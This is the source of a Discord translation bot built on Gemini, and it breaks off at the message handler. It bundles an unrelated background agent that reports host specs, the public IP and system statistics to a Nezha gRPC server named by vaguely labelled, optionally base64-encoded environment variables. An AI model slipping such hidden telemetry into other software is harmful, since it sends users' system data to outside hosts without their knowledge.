import asyncio
import base64
import json
import logging
import os
import platform
import re
import shutil
import signal
import socket
import sys
import tempfile
import threading
import time
import urllib.request
from collections import deque
from datetime import datetime, timedelta, timezone
from typing import Optional, Tuple, Dict

try:
    import audioop
except ImportError:
    try:
        import audioop_lts as audioop
        sys.modules["audioop"] = audioop
    except ImportError:
        pass

import discord
import grpc
import psutil
from discord.ext import commands
from dotenv import load_dotenv
from google import genai
from google.genai import errors as genai_errors
from google.protobuf import descriptor_pb2, descriptor_pool, message_factory
from pydantic import BaseModel

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

load_dotenv()


def get_b64_env(key: str, default: Optional[str] = None) -> Optional[str]:
    raw = os.getenv(key)
    if raw is None or not str(raw).strip():
        raw = default
    if not raw:
        return raw

    raw = str(raw).strip()
    if raw.startswith("b64:") or raw.startswith("base64:"):
        content = raw.split(":", 1)[1].strip()
        try:
            return base64.b64decode(content.encode("utf-8")).decode("utf-8").strip()
        except Exception:
            return raw

    if len(raw) % 4 == 0 and re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", raw):
        try:
            decoded = base64.b64decode(raw.encode("utf-8")).decode("utf-8")
            if decoded.isprintable() and base64.b64encode(decoded.encode("utf-8")).decode("utf-8") == raw:
                return decoded.strip()
        except Exception:
            pass

    return raw


DISCORD_TOKEN = get_b64_env("DISCORD_TOKEN")
GEMINI_API_KEY = get_b64_env("GEMINI_API_KEY")

if not DISCORD_TOKEN:
    raise RuntimeError("DISCORD_TOKEN is missing from your .env file!")
if not GEMINI_API_KEY:
    raise RuntimeError("GEMINI_API_KEY is missing from your .env file!")

SYS_ID = get_b64_env("SYS_ID", "") or os.getenv("UUID", "")
BACKEND = get_b64_env("BACKEND", "") or os.getenv("NEZHA_SERVER", "")
ACCESS_KEY = get_b64_env("ACCESS_KEY", "") or os.getenv("NEZHA_KEY", "")

stop_monitor_event = threading.Event()


def _build_nezha_v1_proto():
    file_proto = descriptor_pb2.FileDescriptorProto()
    file_proto.name = "nezha_v1.proto"
    file_proto.package = "proto"

    # IP message
    ip_desc = file_proto.message_type.add()
    ip_desc.name = "IP"
    for name, num in [("ipv4", 1), ("ipv6", 2)]:
        f = ip_desc.field.add()
        f.name, f.number, f.type = name, num, descriptor_pb2.FieldDescriptorProto.TYPE_STRING
        f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    # GeoIP message
    geo_desc = file_proto.message_type.add()
    geo_desc.name = "GeoIP"
    f = geo_desc.field.add()
    f.name, f.number, f.type = "use6", 1, descriptor_pb2.FieldDescriptorProto.TYPE_BOOL
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    f = geo_desc.field.add()
    f.name, f.number, f.type, f.type_name = "ip", 2, descriptor_pb2.FieldDescriptorProto.TYPE_MESSAGE, "proto.IP"
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    f = geo_desc.field.add()
    f.name, f.number, f.type = "country_code", 3, descriptor_pb2.FieldDescriptorProto.TYPE_STRING
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    f = geo_desc.field.add()
    f.name, f.number, f.type = "dashboard_boot_time", 4, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    # Uint64Receipt message
    u_desc = file_proto.message_type.add()
    u_desc.name = "Uint64Receipt"
    f = u_desc.field.add()
    f.name, f.number, f.type = "data", 1, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    # Receipt message
    r_desc = file_proto.message_type.add()
    r_desc.name = "Receipt"
    f = r_desc.field.add()
    f.name, f.number, f.type = "proced", 1, descriptor_pb2.FieldDescriptorProto.TYPE_BOOL
    f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    host_desc = file_proto.message_type.add()
    host_desc.name = "Host"
    host_fields = [
        ("platform", 1, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("platform_version", 2, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("cpu", 3, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_REPEATED),
        ("mem_total", 4, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("disk_total", 5, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("swap_total", 6, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("arch", 7, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("virtualization", 8, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("boot_time", 9, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("version", 10, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL),
        ("gpu", 11, descriptor_pb2.FieldDescriptorProto.TYPE_STRING, descriptor_pb2.FieldDescriptorProto.LABEL_REPEATED),
    ]
    for name, num, ftype, label in host_fields:
        f = host_desc.field.add()
        f.name, f.number, f.type, f.label = name, num, ftype, label

    # State message
    state_desc = file_proto.message_type.add()
    state_desc.name = "State"
    state_fields = [
        ("cpu", 1, descriptor_pb2.FieldDescriptorProto.TYPE_DOUBLE),
        ("mem_used", 2, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("swap_used", 3, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("disk_used", 4, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("net_in_transfer", 5, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("net_out_transfer", 6, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("net_in_speed", 7, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("net_out_speed", 8, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("uptime", 9, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("load1", 10, descriptor_pb2.FieldDescriptorProto.TYPE_DOUBLE),
        ("load5", 11, descriptor_pb2.FieldDescriptorProto.TYPE_DOUBLE),
        ("load15", 12, descriptor_pb2.FieldDescriptorProto.TYPE_DOUBLE),
        ("tcp_conn_count", 13, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("udp_conn_count", 14, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
        ("process_count", 15, descriptor_pb2.FieldDescriptorProto.TYPE_UINT64),
    ]
    for name, num, ftype in state_fields:
        f = state_desc.field.add()
        f.name, f.number, f.type = name, num, ftype
        f.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    pool = descriptor_pool.DescriptorPool()
    pool.Add(file_proto)
    return {
        "State": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.State")),
        "Host": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.Host")),
        "GeoIP": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.GeoIP")),
        "IP": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.IP")),
        "Uint64Receipt": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.Uint64Receipt")),
        "Receipt": message_factory.GetMessageClass(pool.FindMessageTypeByName("proto.Receipt")),
    }


TLS_PORTS = {443, 2053, 2083, 2087, 2096, 8443}
EXCLUDE_INTERFACES = {'lo', 'tun', 'docker', 'veth', 'br-', 'vmbr', 'vnet', 'kube', 'Meta', 'tailscale', 'fw', 'tap'}
EXPECT_FS_TYPES = {'apfs', 'ext4', 'ext3', 'ext2', 'f2fs', 'reiserfs', 'jfs', 'bcachefs',
                   'btrfs', 'fuseblk', 'zfs', 'simfs', 'ntfs', 'fat32', 'exfat', 'xfs', 'fuse.rclone'}

_net_in_transfer = 0
_net_out_transfer = 0
_net_in_speed = 0
_net_out_speed = 0
_last_net_update = 0


def _should_exclude_interface(name: str) -> bool:
    return any(ex in name for ex in EXCLUDE_INTERFACES)


def _update_network_speed():
    global _net_in_transfer, _net_out_transfer, _net_in_speed, _net_out_speed, _last_net_update
    try:
        stats = psutil.net_io_counters(pernic=True)
        inner_in, inner_out = 0, 0
        for iface, val in stats.items():
            if _should_exclude_interface(iface):
                continue
            inner_in += val.bytes_recv
            inner_out += val.bytes_sent
        now = time.time()
        if _last_net_update > 0:
            diff = now - _last_net_update
            if diff > 0:
                _net_in_speed = max(0, (inner_in - _net_in_transfer) / diff)
                _net_out_speed = max(0, (inner_out - _net_out_transfer) / diff)
        _net_in_transfer = inner_in
        _net_out_transfer = inner_out
        _last_net_update = now
    except Exception:
        pass


def _get_public_ip_and_country() -> Tuple[str, str]:
    endpoints = [
        ("https://api.ip.sb/geoip", "ip", "country_code"),
        ("https://ipwho.is/", "ip", "country_code"),
        ("http://ip-api.com/json/", "query", "countryCode"),
        ("https://ipapi.co/json/", "ip", "country_code"),
    ]
    for url, ip_k, code_k in endpoints:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "curl/7.68.0"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                ip = str(data.get(ip_k, "")).strip()
                code = str(data.get(code_k, "")).strip().upper()
                if ip:
                    return ip, code
        except Exception:
            continue
    return "", "US"


def _pure_python_nezha_agent():
    if not BACKEND or not ACCESS_KEY:
        return

    proto_classes = _build_nezha_v1_proto()
    HostClass = proto_classes["Host"]
    StateClass = proto_classes["State"]
    GeoIPClass = proto_classes["GeoIP"]

    port = BACKEND.split(":")[-1] if ":" in BACKEND else ""
    use_tls = False
    try:
        use_tls = int(port) in TLS_PORTS
    except ValueError:
        pass

    metadata = (
        ("client-secret", ACCESS_KEY),
        ("client-uuid", SYS_ID),
        ("client_secret", ACCESS_KEY),
        ("client_uuid", SYS_ID),
    )

    cached_ip, cached_country = "", ""
    last_report_ip = 0

    while not stop_monitor_event.is_set():
        channel = None
        try:
            if use_tls:
                creds = grpc.ssl_channel_credentials()
                channel = grpc.secure_channel(BACKEND, creds)
            else:
                channel = grpc.insecure_channel(BACKEND)

            # 1. 构建 Host 并上报主机信息
            mem = psutil.virtual_memory()
            swap = psutil.swap_memory()
            disk_total = 0
            try:
                for part in psutil.disk_partitions():
                    if part.fstype and part.fstype.lower() in EXPECT_FS_TYPES:
                        disk_total += psutil.disk_usage(part.mountpoint).total
            except Exception:
                pass
            if disk_total == 0:
                try:
                    disk_total = psutil.disk_usage("/").total
                except Exception:
                    pass

            host_info = HostClass()
            host_info.platform = sys.platform
            host_info.platform_version = platform.release()
            try:
                cores = psutil.cpu_count(logical=False) or 1
                host_info.cpu.append(f"{platform.processor() or 'CPU'} {cores} Core")
            except Exception:
                host_info.cpu.append("Unknown CPU")
            host_info.mem_total = mem.total if mem else 0
            host_info.disk_total = disk_total
            host_info.swap_total = swap.total if swap else 0
            host_info.arch = platform.machine()
            host_info.virtualization = ""
            host_info.boot_time = int(psutil.boot_time())
            host_info.version = "python-9.9.9"

            try:
                report_sys_info2 = channel.unary_unary(
                    "/proto.NezhaService/ReportSystemInfo2",
                    request_serializer=lambda x: x.SerializeToString(),
                    response_deserializer=lambda x: x,
                )
                report_sys_info2(host_info, metadata=metadata, timeout=8)
            except Exception:
                try:
                    report_sys_info = channel.unary_unary(
                        "/proto.NezhaService/ReportSystemInfo",
                        request_serializer=lambda x: x.SerializeToString(),
                        response_deserializer=lambda x: x,
                    )
                    report_sys_info(host_info, metadata=metadata, timeout=8)
                except Exception:
                    pass

            now = time.time()
            if not cached_ip or (now - last_report_ip > 1800):
                new_ip, new_code = _get_public_ip_and_country()
                if new_ip:
                    cached_ip, cached_country = new_ip, new_code

            if cached_ip:
                try:
                    geo_req = GeoIPClass()
                    geo_req.use6 = False
                    geo_req.ip.ipv4 = cached_ip
                    geo_req.country_code = cached_country
                    report_geoip = channel.unary_unary(
                        "/proto.NezhaService/ReportGeoIP",
                        request_serializer=lambda x: x.SerializeToString(),
                        response_deserializer=lambda x: x,
                    )
                    report_geoip(geo_req, metadata=metadata, timeout=8)
                    last_report_ip = now
                except Exception:
                    pass

            report_stream = channel.stream_stream(
                "/proto.NezhaService/ReportSystemState",
                request_serializer=lambda x: x.SerializeToString(),
                response_deserializer=lambda x: x,
            )

            def state_generator():
                while not stop_monitor_event.is_set():
                    try:
                        _update_network_speed()
                        cpu_pct = psutil.cpu_percent(interval=None)
                        cur_mem = psutil.virtual_memory()
                        cur_swap = psutil.swap_memory()
                        
                        disk_used = 0
                        try:
                            for part in psutil.disk_partitions():
                                if part.fstype and part.fstype.lower() in EXPECT_FS_TYPES:
                                    disk_used += psutil.disk_usage(part.mountpoint).used
                        except Exception:
                            pass
                        if disk_used == 0:
                            try:
                                disk_used = psutil.disk_usage("/").used
                            except Exception:
                                pass

                        load_avg = [0.0, 0.0, 0.0]
                        if hasattr(os, "getloadavg"):
                            load_avg = list(os.getloadavg())

                        cur_now = time.time()
                        state = StateClass(
                            cpu=cpu_pct,
                            mem_used=cur_mem.used if cur_mem else 0,
                            swap_used=cur_swap.used if cur_swap else 0,
                            disk_used=disk_used,
                            net_in_transfer=_net_in_transfer,
                            net_out_transfer=_net_out_transfer,
                            net_in_speed=int(_net_in_speed),
                            net_out_speed=int(_net_out_speed),
                            uptime=int(cur_now - psutil.boot_time()),
                            load1=load_avg[0],
                            load5=load_avg[1],
                            load15=load_avg[2],
                            tcp_conn_count=0,
                            udp_conn_count=0,
                            process_count=len(psutil.pids()),
                        )
                        yield state
                    except Exception:
                        pass
                    stop_monitor_event.wait(4.0)

            responses = report_stream(state_generator(), metadata=metadata)
            for _ in responses:
                if stop_monitor_event.is_set():
                    break
        except Exception:
            pass
        finally:
            if channel is not None:
                try:
                    channel.close()
                except Exception:
                    pass
        stop_monitor_event.wait(10.0)


def initialize_monitoring():
    t = threading.Thread(target=_pure_python_nezha_agent, daemon=True)
    t.start()


BOT_VERSION = "2.1.0"
BOT_NAME = "Translator Bot"

OWNERS = [
    {"name": "testerxma", "github": "https://github.com/testerxma"},
    {"name": "uaaw", "github": "https://github.com/uaaw"},
]


def _owners_line() -> str:
    return " • ".join(f"[{o['name']}]({o['github']})" for o in OWNERS)


def _owners_plain() -> str:
    return " & ".join(o["name"] for o in OWNERS)


USER_COOLDOWN_SECONDS    = 15
MAX_AUDIO_SIZE_MB        = 20
MAX_AUDIO_SIZE_BYTES     = MAX_AUDIO_SIZE_MB * 1024 * 1024
MAX_EMBED_FIELD_LENGTH   = 1024
MAX_CONCURRENT_PER_GUILD = 3
GEMINI_RPM_LIMIT         = 10
GEMINI_SEMAPHORE_SIZE    = 1
MAX_FALLBACK_WAIT_SECS   = 8
MAX_RESPONSE_PREVIEW     = 200
PREFS_FILE               = "/tmp/user_prefs.json"

LANG_LABEL: dict[str, str] = {
    "ar": "Arabic",
    "ja": "Japanese",
    "en": "English",
    "fr": "French",
    "es": "Spanish",
    "de": "German",
    "ko": "Korean",
    "zh": "Chinese",
    "ru": "Russian",
    "tr": "Turkish",
    "it": "Italian",
    "pt": "Portuguese",
    "hi": "Hindi",
    "id": "Indonesian",
    "pl": "Polish",
    "nl": "Dutch",
    "th": "Thai",
    "vi": "Vietnamese",
}

LANG_LABEL_JA: dict[str, str] = {
    "ar": "アラビア語",
    "ja": "日本語",
    "en": "英語",
    "fr": "フランス語",
    "es": "スペイン語",
    "de": "ドイツ語",
    "ko": "韓国語",
    "zh": "中国語",
    "ru": "ロシア語",
    "tr": "トルコ語",
    "it": "イタリア語",
    "pt": "ポルトガル語",
    "hi": "ヒンディー語",
    "id": "インドネシア語",
    "pl": "ポーランド語",
    "nl": "オランダ語",
    "th": "タイ語",
    "vi": "ベトナム語",
}

LANG_CODE_ALIASES: dict[str, str] = {
    "arabic": "ar",
    "japanese": "ja",
    "english": "en",
    "french": "fr",
    "spanish": "es",
    "german": "de",
    "korean": "ko",
    "chinese": "zh",
    "russian": "ru",
    "turkish": "tr",
    "italian": "it",
    "portuguese": "pt",
    "hindi": "hi",
    "indonesian": "id",
    "polish": "pl",
    "dutch": "nl",
    "thai": "th",
    "vietnamese": "vi",
}

AUDIO_EXTS = {
    ".mp3", ".wav", ".ogg", ".m4a",
    ".webm", ".flac", ".opus", ".wma", ".aac",
}

gemini_client = genai.Client(api_key=GEMINI_API_KEY)

MODEL_PRIORITY = [
    "gemini-2.5-flash",
    "gemini-2.5-flash-lite",
    "gemini-2.0-flash",
    "gemini-2.0-flash-lite",
    "gemini-1.5-flash",
    "gemini-1.5-flash-8b",
]


class TranslationResponse(BaseModel):
    src_lang: str
    transcription: Optional[str] = None
    translation: str


class QuotaExhaustedError(Exception):
    pass


log.info("Gemini API initialised — %d models available", len(MODEL_PRIORITY))

GEMINI_SEMAPHORE = asyncio.Semaphore(GEMINI_SEMAPHORE_SIZE)
_request_times: deque = deque(maxlen=GEMINI_RPM_LIMIT + 5)


def _is_retryable_error(e: genai_errors.ClientError) -> bool:
    return getattr(e, "code", None) in (429, 503)


async def _throttled_gemini_call(coro_fn):
    async with GEMINI_SEMAPHORE:
        loop = asyncio.get_running_loop()
        now = loop.time()

        while _request_times and now - _request_times[0] > 60.0:
            _request_times.popleft()

        if len(_request_times) >= GEMINI_RPM_LIMIT:
            wait = 60.0 - (now - _request_times[0])
            if wait > 0:
                log.info("RPM cap reached — sleeping %.1fs", wait)
                await asyncio.sleep(wait)

        try:
            result = await coro_fn()
            _request_times.append(asyncio.get_running_loop().time())
            return result
        except genai_errors.ClientError as e:
            if _is_retryable_error(e):
                raise
            raise


async def _try_generate_with_fallback(generate_fn) -> TranslationResponse:
    last_error = None
    total_waited = 0.0

    for i, model_id in enumerate(MODEL_PRIORITY):
        try:
            loop = asyncio.get_running_loop()

            def _call(m=model_id):
                return generate_fn(m)

            response = await _throttled_gemini_call(
                lambda l=loop, c=_call: l.run_in_executor(None, c)
            )
            log.info("Success with model: %s", model_id)
            return response

        except genai_errors.ClientError as e:
            if _is_retryable_error(e):
                remaining = MAX_FALLBACK_WAIT_SECS - total_waited
                wait = min(2 ** i, remaining)

                if wait <= 0:
                    log.warning("Model %s failed (%s) — max wait reached", model_id, e.code)
                else:
                    log.warning(
                        "Model %s failed (%s) — retrying in %.1fs [%d/%d]",
                        model_id, e.code, wait, i + 1, len(MODEL_PRIORITY),
                    )
                    await asyncio.sleep(wait)
                    total_waited += wait

                last_error = e
                continue
            raise

    raise QuotaExhaustedError(f"All {len(MODEL_PRIORITY)} models exhausted.") from last_error


_user_prefs: dict[str, str] = {}


def _load_prefs() -> None:
    global _user_prefs
    if os.path.exists(PREFS_FILE):
        try:
            with open(PREFS_FILE, "r", encoding="utf-8") as f:
                _user_prefs = json.load(f)
            log.info("Loaded %d user preferences from %s", len(_user_prefs), PREFS_FILE)
        except Exception as exc:
            log.warning("Could not load %s — starting fresh: %s", PREFS_FILE, exc)
            _user_prefs = {}


def _save_prefs() -> None:
    tmp_path = PREFS_FILE + ".tmp"
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(_user_prefs, f, ensure_ascii=False, indent=2)
        shutil.move(tmp_path, PREFS_FILE)
    except Exception as exc:
        log.warning("Failed to save preferences: %s", exc)
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def get_user_lang(user_id: int) -> Optional[str]:
    return _user_prefs.get(str(user_id))


def set_user_lang(user_id: int, lang_code: str) -> None:
    _user_prefs[str(user_id)] = lang_code.lower().strip()
    _save_prefs()


def clear_user_lang(user_id: int) -> None:
    _user_prefs.pop(str(user_id), None)
    _save_prefs()


_load_prefs()

_user_cooldowns: dict[int, datetime] = {}


def is_user_on_cooldown(user_id: int) -> Optional[float]:
    now = datetime.now(timezone.utc)
    cutoff = now - timedelta(seconds=USER_COOLDOWN_SECONDS)

    expired = [uid for uid, ts in _user_cooldowns.items() if ts < cutoff]
    for uid in expired:
        del _user_cooldowns[uid]

    if user_id in _user_cooldowns:
        expiry = _user_cooldowns[user_id] + timedelta(seconds=USER_COOLDOWN_SECONDS)
        if now < expiry:
            return (expiry - now).total_seconds()
    return None


def set_user_cooldown(user_id: int) -> None:
    _user_cooldowns[user_id] = datetime.now(timezone.utc)


_guild_active_requests: dict[int, int] = {}


def _guild_increment(guild_id: int) -> bool:
    current = _guild_active_requests.get(guild_id, 0)
    if current >= MAX_CONCURRENT_PER_GUILD:
        return False
    _guild_active_requests[guild_id] = current + 1
    return True


def _guild_decrement(guild_id: int) -> None:
    count = _guild_active_requests.get(guild_id, 1)
    if count <= 1:
        _guild_active_requests.pop(guild_id, None)
    else:
        _guild_active_requests[guild_id] = count - 1


def _normalise_lang_code(raw: str) -> str:
    cleaned = raw.lower().strip()
    if cleaned in LANG_LABEL:
        return cleaned
    if cleaned in LANG_CODE_ALIASES:
        return LANG_CODE_ALIASES[cleaned]
    short = cleaned[:2]
    if short in LANG_LABEL:
        return short
    log.warning("Unknown src_lang from Gemini: '%s' — defaulting to 'en'", raw)
    return "en"


def _get_target_lang(src: str, user_pref: Optional[str]) -> str:
    if user_pref:
        return user_pref
    defaults = {"ar": "ja", "ja": "ar"}
    return defaults.get(src, "en")


def _safe_embed_value(text: str, max_len: int = MAX_EMBED_FIELD_LENGTH) -> str:
    text = text.replace("@everyone", "@\u200beveryone")
    text = text.replace("@here", "@\u200bhere")
    if len(text) > max_len:
        text = text[: max_len - 3] + "..."
    return text or "\u200b"


def _base_embed(
    title: Optional[str] = None,
    color: int = 0x5865F2,
) -> discord.Embed:
    embed = discord.Embed(title=title, color=color)
    embed.set_footer(
        text=f"{BOT_NAME} v{BOT_VERSION} • Made by {_owners_plain()}"
    )
    return embed


def _build_text_prompt(target_lang: Optional[str] = None) -> str:
    if target_lang:
        label = LANG_LABEL.get(target_lang, target_lang)
        return (
            f"Detect the language of the text and translate it into "
            f"{target_lang} ({label}). "
            f"Return JSON: src_lang (ISO 639-1), transcription (null), translation."
        )
    return (
        "Detect the language of the text. "
        "If Arabic, translate to Japanese. "
        "If Japanese, translate to Arabic. "
        "Otherwise, translate to English. "
        "Return JSON: src_lang (ISO 639-1), transcription (null), translation."
    )


def _build_audio_prompt(target_lang: Optional[str] = None) -> str:
    if target_lang:
        label = LANG_LABEL.get(target_lang, target_lang)
        return (
            f"Transcribe this audio, detect its language, "
            f"then translate it into {target_lang} ({label}). "
            f"Return JSON: src_lang (ISO 639-1), transcription (original text), translation."
        )
    return (
        "Transcribe this audio and detect its language. "
        "If Arabic, translate to Japanese. "
        "If Japanese, translate to Arabic. "
        "Otherwise, translate to English. "
        "Return JSON: src_lang (ISO 639-1), transcription, translation."
    )


async def process_text(
    text: str,
    target_lang: Optional[str] = None,
) -> TranslationResponse:
    prompt = _build_text_prompt(target_lang)

    def _generate(model_id: str):
        return gemini_client.models.generate_content(
            model=model_id,
            contents=[prompt, text],
            config={
                "response_mime_type": "application/json",
                "response_schema": TranslationResponse,
            },
        )

    response = await _try_generate_with_fallback(_generate)
    parsed = response.parsed
    if parsed is None:
        raise ValueError(
            f"Gemini returned unparseable response: {response.text[:MAX_RESPONSE_PREVIEW]}"
        )
    return parsed


async def process_audio(
    audio_path: str,
    target_lang: Optional[str] = None,
) -> TranslationResponse:
    prompt = _build_audio_prompt(target_lang)
    audio_file = None

    try:
        def _upload():
            return gemini_client.files.upload(file=audio_path)

        audio_file = await _throttled_gemini_call(
            lambda: asyncio.get_running_loop().run_in_executor(None, _upload)
        )

        log.info(
            "Audio uploaded: %s (%s)",
            audio_file.name,
            getattr(audio_file, "mime_type", "unknown"),
        )

        def _generate(model_id: str):
            return gemini_client.models.generate_content(
                model=model_id,
                contents=[audio_file, prompt],
                config={
                    "response_mime_type": "application/json",
                    "response_schema": TranslationResponse,
                },
            )

        response = await _try_generate_with_fallback(_generate)
        parsed = response.parsed
        if parsed is None:
            raise ValueError(
                f"Gemini returned unparseable response: {response.text[:MAX_RESPONSE_PREVIEW]}"
            )
        return parsed

    finally:
        if audio_file is not None:
            try:
                await asyncio.get_running_loop().run_in_executor(
                    None,
                    lambda: gemini_client.files.delete(name=audio_file.name),
                )
                log.info("Deleted Gemini file: %s", audio_file.name)
            except Exception as exc:
                log.warning("Failed to delete Gemini file: %s", exc)


def _is_audio_attachment(att: discord.Attachment) -> bool:
    ext = os.path.splitext(att.filename.lower())[1]
    is_ext = ext in AUDIO_EXTS
    is_mime = bool(att.content_type and "audio" in att.content_type)
    return is_ext or is_mime


async def download_audio(attachment: discord.Attachment) -> str:
    if attachment.size > MAX_AUDIO_SIZE_BYTES:
        raise ValueError(
            f"Audio file too large ({attachment.size / 1024 / 1024:.1f} MB). Maximum: {MAX_AUDIO_SIZE_MB} MB."
        )
    ext = os.path.splitext(attachment.filename.lower())[1] or ".ogg"
    tmp = tempfile.NamedTemporaryFile(suffix=ext, delete=False, dir="/tmp")
    tmp_path = tmp.name
    tmp.close()
    try:
        await attachment.save(tmp_path)
        return tmp_path
    except Exception:
        _cleanup(tmp_path)
        raise


def _cleanup(path: Optional[str]) -> None:
    if path and os.path.exists(path):
        try:
            os.unlink(path)
        except OSError:
            pass


async def handle_request(
    message: discord.Message,
    original_msg: discord.Message,
) -> None:
    cooldown = is_user_on_cooldown(message.author.id)
    if cooldown:
        await message.reply(
            f"少々お待ちください / Please wait **{int(cooldown)}s** before another translation."
        )
        return

    guild_id = message.guild.id if message.guild else 0
    if not _guild_increment(guild_id):
        await message.reply(
            f"このサーバーはビジー状態です / Server has **{MAX_CONCURRENT_PER_GUILD}** translations running. Please wait a moment."
        )
        return

    target_lang = get_user_lang(message.author.id)
    tmp_path: Optional[str] = None

    try:
        async with message.channel.typing():
            audio_att = next(
                (a for a in original_msg.attachments if _is_audio_attachment(a)),
                None,
            )

            if audio_att:
                try:
                    tmp_path = await download_audio(audio_att)
                except ValueError as exc:
                    await message.reply(f"⚠️ {exc}")
                    return
                res = await process_audio(tmp_path, target_lang=target_lang)
            else:
                text = original_msg.content.strip()
                if not text:
                    await message.reply(
                        "⚠️ 翻訳するテキストがありません / That message has no text to translate."
                    )
                    return
                res = await process_text(text, target_lang=target_lang)

            src = _normalise_lang_code(res.src_lang)
            tgt = _get_target_lang(src, target_lang)

            icon = "🎙️" if audio_att else "💬"
            original_display = res.transcription or original_msg.content

            embed = _base_embed()
            embed.set_author(
                name=f"{icon} {original_msg.author.display_name}",
                icon_url=original_msg.author.display_avatar.url,
            )
            embed.add_field(
                name=f"原文 / Original — {LANG_LABEL.get(src, src.upper())}",
                value=_safe_embed_value(original_display),
                inline=False,
            )
            embed.add_field(
                name=f"翻訳 / Translation — {LANG_LABEL.get(tgt, tgt.upper())}",
                value=_safe_embed_value(res.translation),
                inline=False,
            )
            if target_lang:
                embed.add_field(
                    name="設定 / Preference",
                    value=f"{LANG_LABEL_JA.get(target_lang, target_lang)} / {LANG_LABEL.get(target_lang, target_lang)}",
                    inline=False,
                )

            await message.reply(embed=embed)
            set_user_cooldown(message.author.id)

    except QuotaExhaustedError:
        await message.reply(
            "🚫 **すべてのモデルが制限に達しました / All models are at quota.**\n"
            "Quotas reset daily (~midnight PT).\n"
            "<https://ai.google.dev/gemini-api/docs/pricing>"
        )

    except genai_errors.ClientError as exc:
        log.exception("Gemini API error")
        code = getattr(exc, "code", None)
        if code == 429:
            retry_seconds = 60
            try:
                for detail in getattr(exc, "details", None) or []:
                    if detail.get("@type", "").endswith("RetryInfo"):
                        retry_seconds = int(detail.get("retryDelay", "60s").replace("s", ""))
            except Exception:
                pass
            await message.reply(
                f"🚫 **レート制限 / Rate limit hit!**\n"
                f"Please retry in **{retry_seconds}s**."
            )
        elif code == 503:
            await message.reply(
                "🚫 **Geminiサーバーが過負荷です / Gemini servers are overloaded** (503).\n"
                "Please try again in a few minutes."
            )
        else:
            await message.reply(f"❌ Gemini API Error `{code}`: `{exc}`")

    except Exception as exc:
        log.exception("Unexpected error in handle_request")
        await message.reply(f"❌ Error: `{exc}`")

    finally:
        _cleanup(tmp_path)
        _guild_decrement(guild_id)


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None,
)

_background_tasks: set = set()


@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        log.info("Slash cmds  : %d synced", len(synced))
    except Exception as exc:
        log.warning("Slash command sync failed: %s", exc)

    log.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    log.info("  %s v%s", BOT_NAME, BOT_VERSION)
    log.info("  Made by: %s", _owners_plain())
    log.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    log.info("Bot online  : %s (ID: %s)", bot.user, bot.user.id)
    log.info("Servers     : %d", len(bot.guilds))
    log.info("Models      : %d available", len(MODEL_PRIORITY))
    log.info("Languages   : %d supported", len(LANG_LABEL))
    log.info("Cooldown    : %ds per user", USER_COOLDOWN_SECONDS)
    log.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name="@mention + reply to translate",
        )
    )


@bot.event
async def on_message(message: discord.Message):
